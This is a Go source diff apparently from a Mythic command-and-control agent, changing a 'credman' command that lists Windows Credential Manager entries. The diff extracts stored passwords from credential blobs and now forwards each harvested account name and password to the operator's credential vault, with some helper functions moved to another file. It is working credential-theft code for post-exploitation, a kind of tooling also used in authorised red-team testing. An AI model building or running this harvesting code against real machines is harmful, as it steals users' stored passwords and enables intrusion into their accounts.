@@ -35,13 +35,7 @@ type credential struct {
 	UserName           *uint16
 }
 
-// Credential type constants
-const (
-	credTypeGeneric           = 1
-	credTypeDomainPassword    = 2
-	credTypeDomainCertificate = 3
-	credTypeDomainVisible     = 4
-)
+// credType constants and isPrintable/credTypeName/credPersistName moved to command_helpers.go
 
 type CredmanCommand struct{}
 
@@ -146,6 +140,7 @@ func credmanList(args credmanArgs, showPasswords bool) structs.CommandResult {
 
 	genericCount := 0
 	domainCount := 0
+	var mythicCreds []structs.MythicCredential
 
 	for _, cred := range credPtrs {
 		target := ""
@@ -169,8 +164,9 @@ func credmanList(args credmanArgs, showPasswords bool) structs.CommandResult {
 			lines = append(lines, fmt.Sprintf("  Username: %s", user))
 		}
 
+		password := ""
 		if showPasswords && cred.CredentialBlobSize > 0 && cred.CredentialBlob != nil {
-			password := extractCredBlob(cred)
+			password = extractCredBlob(cred)
 			if password != "" {
 				lines = append(lines, fmt.Sprintf("  Password: %s", password))
 			}
@@ -186,6 +182,23 @@ func credmanList(args credmanArgs, showPasswords bool) structs.CommandResult {
 		lines = append(lines, fmt.Sprintf("  Persist:  %s", persistName))
 		lines = append(lines, "")
 
+		// Report credentials with usernames to Mythic vault
+		if user != "" {
+			credType := "plaintext"
+			credValue := password
+			if credValue == "" || !showPasswords {
+				credType = "plaintext"
+				credValue = fmt.Sprintf("[credman:%s] blob=%d bytes", typeName, cred.CredentialBlobSize)
+			}
+			mythicCreds = append(mythicCreds, structs.MythicCredential{
+				CredentialType: credType,
+				Realm:          target,
+				Account:        user,
+				Credential:     credValue,
+				Comment:        fmt.Sprintf("credman %s (%s)", args.Action, typeName),
+			})
+		}
+
 		switch cred.Type {
 		case credTypeGeneric:
 			genericCount++
@@ -196,11 +209,15 @@ func credmanList(args credmanArgs, showPasswords bool) structs.CommandResult {
 
 	lines = append(lines, fmt.Sprintf("Summary: %d generic, %d domain credentials", genericCount, domainCount))
 
-	return structs.CommandResult{
+	result := structs.CommandResult{
 		Output:    strings.Join(lines, "\n"),
 		Status:    "success",
 		Completed: true,
 	}
+	if len(mythicCreds) > 0 {
+		result.Credentials = &mythicCreds
+	}
+	return result
 }
 
 func extractCredBlob(cred *credential) string {
@@ -225,39 +242,4 @@ func extractCredBlob(cred *credential) string {
 	return fmt.Sprintf("[binary data, %d bytes]", cred.CredentialBlobSize)
 }
 
-func isPrintable(s string) bool {
-	for _, r := range s {
-		if r < 0x20 || r == 0x7f {
-			return false
-		}
-	}
-	return len(s) > 0
-}
-
-func credTypeName(t uint32) string {
-	switch t {
-	case credTypeGeneric:
-		return "Generic"
-	case credTypeDomainPassword:
-		return "Domain Password"
-	case credTypeDomainCertificate:
-		return "Domain Certificate"
-	case credTypeDomainVisible:
-		return "Domain Visible Password"
-	default:
-		return fmt.Sprintf("Unknown (%d)", t)
-	}
-}
-
-func credPersistName(p uint32) string {
-	switch p {
-	case 1:
-		return "Session"
-	case 2:
-		return "Local Machine"
-	case 3:
-		return "Enterprise"
-	default:
-		return fmt.Sprintf("Unknown (%d)", p)
-	}
-}
+// isPrintable, credTypeName, credPersistName moved to command_helpers.go
